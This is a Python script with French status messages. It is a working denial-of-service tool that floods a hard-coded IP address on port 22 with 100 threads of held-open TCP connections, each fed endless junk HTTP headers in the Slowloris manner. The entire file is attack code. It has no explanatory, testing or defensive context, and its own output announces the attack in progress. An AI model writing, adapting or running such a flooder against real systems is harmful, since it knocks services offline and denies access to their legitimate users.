import socket
import threading
import time

TARGET_IP = '192.1.1.2'
TARGET_PORT = 22
THREADS = 100
SOCKETS_PER_THREAD = 5

def dos_attack(target_ip, target_port):
    sockets = []
    
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            sockets.append(s)
        except Exception as e:
            pass
    
    print(f"Thread {threading.current_thread().name}: {len(sockets)} sockets créés")
    
    while sockets:
        for s in sockets[:]:  
            try:
                s.send(b"X-Header: " + b"a"*1024 + b"\r\n")
            except:
                try:
                    sockets.remove(s)
                    s.close()
                except:
                    pass
        time.sleep(0.001)
    
    print(f"Thread {threading.current_thread().name}: terminé")

print(f"Démarrage de {THREADS} threads...")
for i in range(THREADS):
    thread = threading.Thread(target=dos_attack, args=(TARGET_IP, TARGET_PORT))
    thread.daemon = True
    thread.start()
    time.sleep(0.01)  

print("Attaque en cours. Appuyez sur Ctrl+C pour arrêter.")

try:
    while True:
        time.sleep(1)
        print(f"Threads actifs: {threading.active_count() - 1}")  
except KeyboardInterrupt:
    print("\nArrêt demandé. Fin du programme.")
